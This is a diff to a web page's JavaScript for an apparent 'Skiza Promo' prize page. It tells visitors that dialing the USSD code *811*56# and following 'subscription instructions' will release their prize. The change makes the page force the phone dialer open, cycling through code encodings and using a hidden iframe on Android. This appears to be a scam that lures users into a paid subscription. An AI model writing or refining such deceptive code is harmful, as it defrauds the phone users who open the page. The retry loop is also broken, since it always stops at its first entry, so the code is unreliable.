@@ -523,23 +523,72 @@
             }
         });
 
-        // Dial button functionality
+        // Improved Dial button functionality for better cross-device compatibility
         dialBtn.addEventListener('click', () => {
-            // Use the correct tel: format with URL encoding for #
-            const ussd = '*811*56%23'; // %23 is the URL-encoded version of #
+            // Try multiple formats for maximum compatibility
+            const ussdCodes = [
+                '*811*56#',           // Plain USSD code
+                'tel:*811*56%23',     // URL encoded with tel: prefix (works on most devices)
+                'tel:*811*56#',       // Plain with tel: prefix
+                'tel:*811*56',        // Without # (some dialers add it automatically)
+                'tel:081156',         // Alternative format
+                'tel:*811*56%23;',    // With semicolon (some Android devices)
+                'tel:*811%2A56%23',   // Different encoding
+                'tel:%2A811%2A56%23', // Another encoding variation
+            ];
             
             // Visual feedback
-            dialBtn.innerHTML = '📞 Dialing...';
+            dialBtn.innerHTML = '📞 Opening dialer...';
             dialBtn.disabled = true;
             
-            if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
-                // Mobile device - launch dialer with properly formatted USSD
-                window.location.href = `tel:${ussd}`;
+            if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                // iOS devices - try multiple formats
+                let success = false;
+                for (let i = 0; i < ussdCodes.length; i++) {
+                    try {
+                        window.location.href = ussdCodes[i];
+                        success = true;
+                        break;
+                    } catch (e) {
+                        continue;
+                    }
+                }
+                
+                if (!success) {
+                    // Fallback for iOS
+                    alert('Please manually dial: *811*56#\n\nThe dialer may not open automatically on your device.');
+                }
+                
+            } else if (/Android/i.test(navigator.userAgent)) {
+                // Android devices - try multiple formats
+                let success = false;
+                for (let i = 0; i < ussdCodes.length; i++) {
+                    try {
+                        window.location.href = ussdCodes[i];
+                        success = true;
+                        break;
+                    } catch (e) {
+                        continue;
+                    }
+                }
+                
+                if (!success) {
+                    // Create hidden iframe as alternative method for Android
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = 'tel:*811*56%23';
+                    document.body.appendChild(iframe);
+                    setTimeout(() => {
+                        document.body.removeChild(iframe);
+                    }, 100);
+                }
+                
             } else {
-                // Desktop - show instruction
-                alert(`To complete your withdrawal:\n\n1. Dial *811*56# on your phone\n2. Follow the subscription instructions\n3. Your prize will be processed within 24 hours\n\nThank you for using Skiza Promo!`);
+                // Desktop or other devices - show manual instructions
+                alert(`To complete your withdrawal:\n\n1. Manually dial *811*56# on your phone\n2. Follow the subscription instructions\n3. Your prize will be processed within 24 hours\n\nThank you for using Skiza Promo!`);
             }
             
+            // Reset button after delay
             setTimeout(() => {
                 dialBtn.innerHTML = '✅ Dialed!';
                 setTimeout(() => {
